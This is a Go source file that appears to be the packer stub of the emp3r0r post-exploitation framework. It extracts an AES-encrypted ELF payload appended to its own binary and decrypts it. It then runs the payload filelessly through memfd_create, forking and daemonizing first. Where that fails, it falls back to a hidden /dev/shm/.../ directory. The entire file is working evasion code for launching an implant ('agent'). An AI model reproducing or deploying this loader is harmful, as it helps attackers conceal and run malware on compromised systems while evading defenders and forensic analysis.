package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/packer/internal/utils"
)

const (
	mfdCloexec     = 0x0001
	memfdCreateX64 = 319
	fork           = 57
)

func runFromMemory(procName string, buffer []byte) {
	fdName := "" // *string cannot be initialized

	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
	_, _ = syscall.Write(int(fd), buffer)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	switch child, _, _ := syscall.Syscall(fork, 0, 0, 0); child {
	case 0:
		break
	case 1:
		// Fork failed!
		log.Fatal("fork failed")
	default:
		// Parent exiting...
		os.Exit(0)
	}

	_ = syscall.Umask(0)
	_, _ = syscall.Setsid()
	_ = syscall.Chdir("/")

	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
	err := syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
	if err != nil {
		log.Fatal(err)
	}
	file.Close()

	progWithArgs := append([]string{procName}, os.Args[1:]...)
	err = syscall.Exec(fdPath, progWithArgs, nil)
	if err == nil {
		log.Println("agent started from memory using memfd_create")
		return
	}

	// older kernel
	log.Printf("memfd_create failed: %v, trying shm_open", err)
	shmPath := "/dev/shm/.../"
	if _, err := os.Stat(shmPath); os.IsNotExist(err) {
		err = os.Mkdir(shmPath, 0700)
		if err != nil {
			log.Fatal(err)
		}
	}
	err = ioutil.WriteFile(shmPath+procName, buffer, 0755)
	if err != nil {
		log.Fatal(err)
	}
	cmd := exec.Command(shmPath+procName, os.Args[1:]...)
	err = cmd.Start()
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	wholeStub, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}
	// locate the ELF file
	elfbegining := bytes.LastIndex(wholeStub, []byte(utils.Sep))
	elfBytes := wholeStub[(elfbegining + len(utils.Sep)):]

	// decrypt attached ELF file
	key := utils.GenAESKey(utils.Key)
	elfdata := utils.AESDecrypt(key, elfBytes)
	if elfdata == nil {
		log.Fatal("AESDecrypt failed")
	}

	// write ELF to memory and run it
	procName := fmt.Sprintf("%d", time.Now().UnixNano())
	runFromMemory(procName, elfdata)
}
